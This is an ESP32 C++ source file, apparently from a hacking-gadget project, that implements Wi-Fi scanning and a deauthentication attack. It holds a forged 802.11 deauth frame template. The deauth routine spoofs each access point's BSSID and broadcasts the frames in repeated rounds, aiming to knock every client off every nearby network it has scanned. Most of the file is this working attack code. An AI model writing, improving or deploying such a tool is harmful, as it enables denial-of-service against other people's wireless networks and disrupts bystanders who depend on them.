/**
 * @file WiFiAttackManager.cpp
 * @brief WiFi scan (reliable) + best-effort deauth (see header for caveats).
 */
#include "WiFiAttackManager.h"
#include <WiFi.h>
#include "esp_wifi.h"

void WiFiAttackManager::init() {
    on = false;
    count = 0;
}

void WiFiAttackManager::enableRadio() {
    if (on) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true); // needed for raw 802.11 TX
    on = true;
}

void WiFiAttackManager::disableRadio() {
    if (!on) return;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    on = false;
}

int WiFiAttackManager::scan() {
    bool wasOn = on;
    if (!wasOn) { WiFi.mode(WIFI_STA); WiFi.disconnect(); }

    int n = WiFi.scanNetworks(false, true);
    count = 0;
    for (int i = 0; i < n && count < WIFI_MAX_APS; i++) {
        WiFiAP& a = aps[count];
        strncpy(a.ssid, WiFi.SSID(i).c_str(), sizeof(a.ssid) - 1);
        a.ssid[sizeof(a.ssid) - 1] = '\0';
        a.rssi = WiFi.RSSI(i);
        a.channel = WiFi.channel(i);
        const uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(a.bssid, b, 6);
        count++;
    }
    WiFi.scanDelete();
    if (!wasOn) WiFi.mode(WIFI_OFF);
    return count;
}

// Standard 26-byte 802.11 deauth frame template.
static uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src (AP) - filled per-target
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid    - filled per-target
    0x00, 0x00,                         // seq
    0x07, 0x00                          // reason: class-3 frame from non-assoc STA
};

void WiFiAttackManager::sendDeauthFor(const WiFiAP& target) {
    memcpy(&deauthFrame[10], target.bssid, 6);
    memcpy(&deauthFrame[16], target.bssid, 6);
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    // Best-effort: return value intentionally ignored (IDF may block deauth TX).
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

void WiFiAttackManager::deauth(uint8_t rounds) {
    if (!on) enableRadio();
    if (count == 0) scan();
    for (uint8_t r = 0; r < rounds; r++) {
        for (int i = 0; i < count; i++) {
            sendDeauthFor(aps[i]);
            delay(2);
        }
    }
}
